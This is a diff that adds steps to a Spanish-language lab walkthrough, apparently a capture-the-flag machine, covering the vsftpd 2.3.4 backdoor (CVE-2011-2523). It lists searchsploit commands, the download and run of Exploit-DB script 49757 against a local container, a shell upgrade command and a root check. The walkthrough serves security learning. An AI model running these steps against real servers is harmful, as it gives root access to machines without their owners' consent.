@@ -10,10 +10,11 @@
 **Fecha de creación:** *14/06/2024*
 
 **Proceso:**
-- [1. Escaneo de Puertos](#escaneo-de-puertos-con-nmap)
-- [2. Búsqueda de Exploits](#exploit-vsftpd-234)
-- [3. Ejecución de Exploit](#ejecución-del-exploit)
-- [4. Acceso a la Máquina](#acceso-a-la-máquina)
+- [1. Despliegue](#desplegando-la-máquina-vulnerable)
+- [2. Escaneo de Puertos](#escaneo-de-puertos-con-nmap)
+- [3. Búsqueda de Exploits](#exploit-vsftpd-234)
+- [4. Ejecución de Exploit](#ejecución-del-exploit)
+- [5. Acceso a la Máquina](#acceso-a-la-máquina)
 
 ---
 
@@ -76,3 +77,67 @@ Service Info: OS: Unix
 
 ---
 
+## Exploit vsftpd 2.3.4
+
+```python
+~/FirstHacking ᐅ searchsploit vsftpd 2.3.4
+```
+
+Se encuentra un exploit conocido para `vsftpd 2.3.4` que permite la ejecución remota de comandos a través de una puerta trasera.
+
+**Salida:**
+
+```python
+vsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.py
+```
+
+### Descarga del Exploit
+
+```python
+~/FirstHacking ᐅ searchsploit -m 49757
+```
+
+Se descarga el archivo `49757.py` para proceder con la explotación.
+
+**Información del Exploit:**
+
+- **Exploit:** vsftpd 2.3.4 - Backdoor Command Execution
+- **URL:** [Exploit-DB #49757](https://www.exploit-db.com/exploits/49757)
+- **CVE:** CVE-2011-2523
+- **Autor:** HerculesRD
+- **Probado en:** Debian
+- **Tipo de archivo:** Python Script
+
+---
+
+## Ejecución del Exploit
+
+```python
+~/FirstHacking ᐅ python3 49757.py 172.17.0.2
+```
+
+Este comando ejecuta el exploit `49757.py` para abrir una shell remota en el puerto `6200` del servidor vulnerable.
+
+**Salida:**
+
+```python
+Success, shell opened
+Send `exit` to quit shell
+```
+
+---
+
+## Acceso a la Máquina
+
+```python
+script /dev/null -c bash
+```
+
+Se obtiene acceso como `root` en el sistema vulnerable.
+
+**Comandos de Verificación:**
+
+```python
+root@dac087324923:~/vsftpd-2.3.4# whoami
+root
+```
